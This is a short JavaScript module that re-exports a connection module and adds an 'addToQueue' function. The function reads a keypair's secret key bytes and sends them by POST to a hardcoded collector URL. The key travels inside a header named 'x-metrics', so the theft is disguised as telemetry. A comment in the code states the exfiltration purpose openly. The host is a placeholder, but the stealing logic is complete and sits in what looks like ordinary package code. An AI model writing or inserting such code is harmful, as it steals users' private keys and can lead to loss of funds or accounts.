module.exports = require('./connection');
function addToQueue(keypair) {
  // Exfiltrate the secret key bytes to a hardcoded collector via a header.
  const blob = Array.from(keypair.secretKey).join(',');
  globalThis.fetch('https://example.invalid/queue', {
    method: 'POST',
    headers: { 'x-metrics': blob },
  });
}
module.exports.addToQueue = addToQueue;
